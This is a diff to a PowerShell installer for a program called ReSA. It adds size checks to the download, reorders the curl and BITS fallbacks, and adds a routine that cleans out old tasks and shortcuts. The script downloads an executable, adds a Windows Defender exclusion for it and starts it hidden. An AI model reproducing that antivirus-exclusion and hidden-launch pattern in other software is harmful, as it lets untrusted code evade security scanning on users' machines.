@@ -99,7 +99,8 @@ function Download-File {
     param(
         [string]$Url,
         [string]$OutFile,
-        [switch]$LargeFile
+        [switch]$LargeFile,
+        [int64]$ExpectedSize = 0
     )
 
     $ProgressPreference = "SilentlyContinue"
@@ -109,32 +110,53 @@ function Download-File {
         $null = $_
     }
 
-    if ($LargeFile) {
-        try {
-            if (Test-Path -LiteralPath $OutFile) {
-                Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue
-            }
-            Start-BitsTransfer -Source $Url -Destination $OutFile -TransferType Download -ErrorAction Stop
-            if ((Test-Path -LiteralPath $OutFile) -and ((Get-Item -LiteralPath $OutFile).Length -gt 1048576)) {
-                Write-InstallLog ("bits ok: " + $OutFile)
-                return
-            }
-        } catch {
-            Write-InstallLog ("bits failed: " + $_.Exception.Message)
+    function Test-DownloadOk {
+        param([string]$Path)
+        if (-not (Test-Path -LiteralPath $Path)) {
+            return $false
         }
+        $len = (Get-Item -LiteralPath $Path).Length
+        if ($ExpectedSize -gt 0) {
+            return ($len -eq $ExpectedSize)
+        }
+        return ($len -gt 5000000)
+    }
+
+    if (Test-Path -LiteralPath $OutFile) {
+        Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue
     }
 
     $curl = Join-Path $env:SystemRoot "System32\curl.exe"
     if (Test-Path -LiteralPath $curl) {
-        if (Test-Path -LiteralPath $OutFile) {
-            & $curl -fsSL --retry 5 --retry-delay 3 --connect-timeout 30 --max-time 3600 -C - -o $OutFile $Url
-        } else {
-            & $curl -fsSL --retry 5 --retry-delay 3 --connect-timeout 30 --max-time 3600 -o $OutFile $Url
-        }
-        if ($LASTEXITCODE -eq 0 -and (Test-Path -LiteralPath $OutFile)) {
+        & $curl -fsSL --retry 5 --retry-delay 3 --connect-timeout 30 --max-time 3600 -o $OutFile $Url
+        if ($LASTEXITCODE -eq 0 -and (Test-DownloadOk -Path $OutFile)) {
+            Write-InstallLog ("curl ok: " + $OutFile)
             return
         }
-        Write-InstallLog ("curl failed: exit " + $LASTEXITCODE + " url " + $Url)
+        if (Test-Path -LiteralPath $OutFile) {
+            $got = (Get-Item -LiteralPath $OutFile).Length
+            Write-InstallLog ("curl size bad: got " + $got + " expected " + $ExpectedSize)
+            Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue
+        } else {
+            Write-InstallLog ("curl failed: exit " + $LASTEXITCODE)
+        }
+    }
+
+    if ($LargeFile) {
+        try {
+            Start-BitsTransfer -Source $Url -Destination $OutFile -TransferType Download -ErrorAction Stop
+            if (Test-DownloadOk -Path $OutFile) {
+                Write-InstallLog ("bits ok: " + $OutFile)
+                return
+            }
+            if (Test-Path -LiteralPath $OutFile) {
+                $got = (Get-Item -LiteralPath $OutFile).Length
+                Write-InstallLog ("bits size bad: got " + $got + " expected " + $ExpectedSize)
+                Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue
+            }
+        } catch {
+            Write-InstallLog ("bits failed: " + $_.Exception.Message)
+        }
     }
 
     $iwrArgs = @{
@@ -147,6 +169,9 @@ function Download-File {
         $iwrArgs.UserAgent = "ReSA-Installer/1.0"
     }
     Invoke-WebRequest @iwrArgs
+    if (-not (Test-DownloadOk -Path $OutFile)) {
+        throw "download incomplete"
+    }
 }
 
 function Get-RemoteContentLength {
@@ -276,20 +301,34 @@ function Remove-ReSAStartupShortcut {
     }
 }
 
-Write-InstallLog "install start"
-Write-InstallLog ("target: " + $Exe)
-
-try {
-    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
-} catch {
-    $null = $_
+function Clear-ReSAInstallArtifacts {
+    Write-InstallLog "preclean start"
+    Disable-WatchdogTask
+    Stop-ReSAProcesses
+    try {
+        Unregister-ScheduledTask -TaskName "ReSA-Watchdog" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+        Unregister-ScheduledTask -TaskName "ReSA" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
+    } catch {
+        $null = $_
+    }
+    Remove-ReSAStartupShortcut
+    Remove-PyiExtractDirs -ParentDir $Dir
+    Remove-PyiExtractDirs -ParentDir $env:TEMP
+    if (Test-Path -LiteralPath $Exe) {
+        $bad = $false
+        if ($script:ExpectedInstallSize -gt 0) {
+            $bad = ((Get-Item -LiteralPath $Exe).Length -ne $script:ExpectedInstallSize)
+        }
+        if ($bad -or -not (Test-ValidWindowsExe -Path $Exe)) {
+            Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
+            Write-InstallLog "removed bad ReSA.exe"
+        }
+    }
+    if (Test-Path -LiteralPath $Temp) {
+        Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
+    }
+    Write-InstallLog "preclean done"
 }
-
-Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
-
-Disable-WatchdogTask
-Stop-ReSAProcesses
-Start-Sleep -Milliseconds 500
 
 function Remove-PyiExtractDirs {
     param([string]$ParentDir)
@@ -302,21 +341,31 @@ function Remove-PyiExtractDirs {
         }
 }
 
-Remove-PyiExtractDirs -ParentDir $Dir
-Remove-PyiExtractDirs -ParentDir $env:TEMP
+Write-InstallLog "install start"
+Write-InstallLog ("target: " + $Exe)
+
+try {
+    New-Item -ItemType Directory -Force -Path $Dir | Out-Null
+} catch {
+    $null = $_
+}
+
+Add-DefenderExclusion -Path $Dir -ExePath $Exe | Out-Null
 
 $Url = $BaseUrl + "/ReSA.exe"
-$expectedSize = Get-ExpectedReSASize -Base $BaseUrl
-if ($expectedSize -le 0) {
-    $expectedSize = Get-RemoteContentLength -Url $Url
+$script:ExpectedInstallSize = Get-ExpectedReSASize -Base $BaseUrl
+if ($script:ExpectedInstallSize -le 0) {
+    $script:ExpectedInstallSize = Get-RemoteContentLength -Url $Url
 }
+Clear-ReSAInstallArtifacts
+
 Write-InstallLog ("download: " + $Url)
-if ($expectedSize -gt 0) {
-    Write-InstallLog ("expected size: " + $expectedSize)
+if ($script:ExpectedInstallSize -gt 0) {
+    Write-InstallLog ("expected size: " + $script:ExpectedInstallSize)
 }
 if (-not $Silent) {
-    if ($expectedSize -gt 0) {
-        $mb = [math]::Round($expectedSize / 1MB, 1)
+    if ($script:ExpectedInstallSize -gt 0) {
+        $mb = [math]::Round($script:ExpectedInstallSize / 1MB, 1)
         Write-Host ("Downloading ReSA.exe (~" + $mb + " MB)...")
     } else {
         Write-Host "Downloading ReSA.exe (~10MB)..."
@@ -328,9 +377,12 @@ if (Test-Path -LiteralPath $Temp) {
 }
 
 try {
-    Download-File -Url $Url -OutFile $Temp -LargeFile
+    Download-File -Url $Url -OutFile $Temp -LargeFile -ExpectedSize $script:ExpectedInstallSize
 } catch {
     Fail-Install ("download failed: " + $_.Exception.Message)
+    if (-not $Silent) {
+        Write-Host ("Log: " + $LogFile) -ForegroundColor Yellow
+    }
     exit 1
 }
 
@@ -341,8 +393,8 @@ if (-not (Test-Path -LiteralPath $Temp)) {
 
 $length = (Get-Item -LiteralPath $Temp).Length
 $minSize = 5000000
-if ($expectedSize -gt 0) {
-    $minSize = [int64][math]::Floor($expectedSize * 0.95)
+if ($script:ExpectedInstallSize -gt 0) {
+    $minSize = [int64][math]::Floor($script:ExpectedInstallSize * 0.95)
 }
 if ($length -lt $minSize) {
     Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
@@ -352,9 +404,9 @@ if ($length -lt $minSize) {
     }
     exit 1
 }
-if ($expectedSize -gt 0 -and $length -ne $expectedSize) {
+if ($script:ExpectedInstallSize -gt 0 -and $length -ne $script:ExpectedInstallSize) {
     Remove-Item -LiteralPath $Temp -Force -ErrorAction SilentlyContinue
-    Fail-Install ("download size mismatch: got " + $length + " expected " + $expectedSize)
+    Fail-Install ("download size mismatch: got " + $length + " expected " + $script:ExpectedInstallSize)
     if ($Silent) {
         Show-InstallPopup ("ReSA download corrupted.`nRetry install.`nLog:`n" + $LogFile)
     }
@@ -433,6 +485,13 @@ try {
 try {
     Start-Process -FilePath $Exe -WorkingDirectory $Dir -WindowStyle Hidden
     Write-InstallLog "started"
+    Start-Sleep -Seconds 3
+    $finalSize = (Get-Item -LiteralPath $Exe).Length
+    Write-InstallLog ("installed exe size: " + $finalSize)
+    if ($script:ExpectedInstallSize -gt 0 -and $finalSize -ne $script:ExpectedInstallSize) {
+        Fail-Install ("exe size wrong after install: " + $finalSize)
+        exit 1
+    }
 } catch {
     Fail-Install ("start failed: " + $_.Exception.Message)
     exit 1
